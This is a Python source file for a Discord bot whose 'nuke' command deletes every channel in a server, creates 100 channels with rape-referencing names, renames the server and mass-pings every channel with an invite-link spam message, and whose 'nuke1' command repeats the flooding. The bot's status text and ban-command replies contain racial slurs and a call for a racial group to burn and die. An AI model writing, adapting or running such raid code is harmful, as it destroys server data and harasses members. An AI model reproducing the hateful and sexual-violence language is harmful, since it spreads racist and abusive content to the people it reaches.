from distutils.log import warn
from email import message
from logging import warning
from turtle import title
import nextcord
intents = nextcord.Intents.default()
intents.message_content = True
from nextcord.ext import commands
from nextcord import slash_command
from nextcord import components
from nextcord import utils
import aiohttp
import asyncio
import datetime
from datetime import *
import time
from nextcord.ext.commands import CommandNotFound
while True:
    bot = commands.Bot(command_prefix='-', intents=intents,help_command=None)
    slash = slash_command(bot)
    
    class colours():    
        default = 0
    teal = 0x1abc9c
    dark_teal = 0x11806a
    green = 0x2ecc71
    dark_green = 0x1f8b4
    blue = 0x3498db
    dark_blue = 0x206694
    purple = 0x9b59b6
    dark_purple = 0x71368a
    magenta = 0xe91e63
    dark_magenta = 0xad1457
    gold = 0xf1c40f
    dark_gold = 0xc27c0e
    orange = 0xe67e22
    dark_orange = 0xa84300
    red = 0xe74c3c
    dark_red = 0x992d22
    lighter_grey = 0x95a5a6
    dark_grey = 0x607d8b
    light_grey = 0x979c9f
    blue= 0x00008B
    aqua = 0x30D5C8

    @bot.event
    async def on_ready():
        await bot.change_presence(activity=nextcord.Activity(type=nextcord.ActivityType.watching,name="all niggers burn and die in hell"),status=nextcord.Status.dnd)
        print('Connected to bot: {}'.format(bot.user.name))
        print('Bot ID: {}'.format(bot.user.id))
        print('Time Started {}'.format(datetime.now()))


    @bot.command()
    @commands.has_permissions(ban_members=True)
    async def ban(ctx, user: nextcord.Member = None,*, reason=None):
        if user is None:
            await ctx.send("nigga actually send a user so i can ban that nigger")
            return
        await user.ban(reason=reason)
        await ctx.send(f"ok master i have banned {user} i greatly appreciate you taking care of my slave ahh self")

    @bot.command()
    async def nuke(ctx):
        guild = ctx.guild
        for channel in guild.channels:
            await channel.delete()
        for i in range(1, 101):
            await guild.create_text_channel(f"RAPED BY QUIV")
        guild = ctx.guild
        await ctx.guild.edit(name='RAIDED AND RAPED BY QUIV NIGGAA')
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")


    @bot.command()
    async def nuke1(ctx):
        await ctx.message.delete()
        guild = ctx.guild
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        for channel in guild.text_channels:
            await channel.send("@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
        await ctx.send(f"@everyone RAIDED AND RAPED BY QUIV https://discord.gg/YjyRT6zRD3")
